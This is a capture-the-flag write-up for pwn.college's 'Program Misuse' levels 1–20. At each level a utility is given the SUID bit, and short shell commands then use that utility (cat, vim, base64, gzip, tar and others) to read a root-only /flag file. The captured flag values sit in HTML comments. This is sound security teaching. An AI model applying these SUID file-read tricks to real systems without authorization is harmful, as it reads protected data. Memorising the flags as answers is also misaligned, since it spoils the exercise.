# [Program Misuse](https://pwn.college/fundamentals/program-misuse)

> ⚠️ DISCLAIMER ⚠️\
> This write-up is for archival and educational purpose. I really encourage you to try first and read any materials given in the lab. Use this write-up as your last resort.\
> Happy learning and good luck! :) –fr.🔮

![](https://progress-bar.dev/39/?title=Incomplete&width=150)

Level: 20/51

## Contents.

<details>

- [level1](#level1)
- [level2](#level2)
- [level3](#level3)
- [level4](#level4)
- [level5](#level5)
- [level6](#level6)
- [level7](#level7)
- [level8](#level8)
- [level9](#level9)
- [level10](#level10)
- [level11](#level11)
- [level12](#level12)
- [level13](#level13)
- [level14](#level14)
- [level15](#level15)
- [level16](#level16)
- [level17](#level17)
- [level18](#level18)
- [level19](#level19)
- [level20](#level20)
</details>

## level1

The flag is located at `/flag` but you can't read it

```sh
$ file /flag
/flag: regular file, no read permission
$ cat /flag
cat: /flag: Permission denied
```

But there's a useful binary located at /challenge

```sh
$ la /challenge/
babysuid_level1
```

Run that and try to read the flag again

```sh
$ /challenge/babysuid_level1
Welcome to /challenge/babysuid_level1!

This challenge is part of a series of programs that
exposes you to very simple programs that let you directly read the flag.

I just set the SUID bit on /usr/bin/cat.
Try to use it to read the flag!

IMPORTANT: make sure to run me (/challenge/babysuid_level1) every time that you restart
this challenge container to make sure that I set the SUID bit on /usr/bin/cat!
$ cat /flag
```

<!-- pwn.college{o8JgfFgwz1uMuzCrREaDZSF_RpC.01M0EDLwgDM5MzW} -->
<br>

## level2

Similar to the previous challenge

```sh
$ /challenge/babysuid_level2
$ more /flag
```

<!-- pwn.college{YaBXhy1QG99J-u27IXun84-OfSe.0FN0EDLwgDM5MzW} -->
<br>

## level3

```sh
$ /challenge/babysuid_level3
$ less /flag
```

<!-- pwn.college{E_aUpmE50FPLlITPeKZ2o01fNnV.0VN0EDLwgDM5MzW} -->
<br>

## level4

```sh
$ /challenge/babysuid_level4
$ tail /flag
```

<!-- pwn.college{8o2gTbd8OdttbmYwTig3PKSwZ06.0lN0EDLwgDM5MzW} -->
<br>

## level5

```sh
$ /challenge/babysuid_level5
$ head /flag
```

<!-- pwn.college{gsTznggpJu6y9der8LTRAN27byo.01N0EDLwgDM5MzW} -->
<br>

## level6

```sh
$ /challenge/babysuid_level6
$ sort /flag
```

<!-- pwn.college{kQeqCQH5qJyRKnPURHpwGNn1SSb.0FO0EDLwgDM5MzW} -->
<br>

## level7

```sh
$ /challenge/babysuid_level7
$ vim /flag
```

> quit: Esc + ":q!"

<!-- pwn.college{kowi5Ysozy9Az09lXRrcMasJWAV.0VO0EDLwgDM5MzW} -->
<br>

## level8

```sh
$ /challenge/babysuid_level8
$ emacs /flag
```

> quit: Ctrl-x Ctrl-c

<!-- pwn.college{w-NpSolbJn97m5Due8T8ReMqHm-.0FM1EDLwgDM5MzW} -->
<br>

## level9

```sh
$ /challenge/babysuid_level9
$ nano /flag
```

> quit: Ctrl-x

<!-- pwn.college{cVnWBQQhRxhjysUI9G8ii_SaADr.0VM1EDLwgDM5MzW} -->
<br>

## level10

```sh
$ /challenge/babysuid_level10
$ rev /flag | rev
```

<!-- pwn.college{Y1nhCuxgERqjMoiEAfdU93ZlJCJ.0lM1EDLwgDM5MzW} -->
<br>

## level11

```sh
$ /challenge/babysuid_level11
$ od -cAn /flag | xargs | tr -d ' '
```

> `od -c` : print printable characters \
> `od -An`: remove offset \
> `xargs` : join multiple lines into one \
> `tr -d` : remove spaces

<!-- pwn.college{0AmsDNHzDUYr6AbxzEqVI-75Ll7.01M1EDLwgDM5MzW} -->
<br>

## level12

```sh
$ /challenge/babysuid_level12
$ hexdump -e '8/1 "%c"' /flag
```

> `-e '8/1 "%c"'`: format string, display 8 hex characters in one line, convert to ASCII

<!-- pwn.college{w-pnN_g5KRqDJxT8ka2ncVEHfj5.0FN1EDLwgDM5MzW} -->
<br>

## level13

```sh
$ /challenge/babysuid_level13
$ xxd -p /flag | xxd -r -p
```

<!-- pwn.college{QB0Ap0fsKOFPAfWmcsiLJpXquEj.0VN1EDLwgDM5MzW} -->
<br>

## level14

```sh
$ /challenge/babysuid_level14
$ base32 /flag | base32 -d
```

<!-- pwn.college{cZS0dZJeqIVxIjVovFNpmB5xRjW.0lN1EDLwgDM5MzW} -->
<br>

## level15

```sh
$ /challenge/babysuid_level15
$ base64 /flag | base64 -d
```

<!-- pwn.college{QHNmu4ZZKaQ_NtHzfrJXEn284KT.01N1EDLwgDM5MzW} -->
<br>

## level16

```sh
$ /challenge/babysuid_level16
$ split /flag
$ cat xaa
```

<!-- pwn.college{82rArGVNl4cZAoT6E_pnkZIS2oK.0FO1EDLwgDM5MzW} -->
<br>

## level17

```sh
$ /challenge/babysuid_level17
$ gzip /flag
$ zcat /flag.gz
```

<!-- pwn.college{Q9PAkScbraY7CLEH_omn_YNVlF7.0VO1EDLwgDM5MzW} -->
<br>

## level18

```sh
$ /challenge/babysuid_level18
$ bzip2 /flag
$ bzip2 -dc /flag.bz2
```

<!-- pwn.college{AKBtSbQH4QG2vYz-MDfHNE6ddqK.0FM2EDLwgDM5MzW} -->
<br>

## level19

```sh
$ /challenge/babysuid_level19
$ zip flag.zip /flag

# ways to read the flag
$ unzip -p flag.zip flag
$ zcat flag.zip
```

<!-- pwn.college{UzRe8LOSxZ5NRboeVLjPajRkvm2.0VM2EDLwgDM5MzW} -->
<br>

## level20

```sh
$ /challenge/babysuid_level20
$ tar -cf flag.tar /flag
$ tar xfO flag.tar flag
```

<!-- pwn.college{QIzD9TkCxtMpzsZlYw95NXIUVVN.0lM2EDLwgDM5MzW} -->
<br>

<!-- ## level

```sh
$ /challenge/babysuid_level
$ less /flag
```
<br> -->
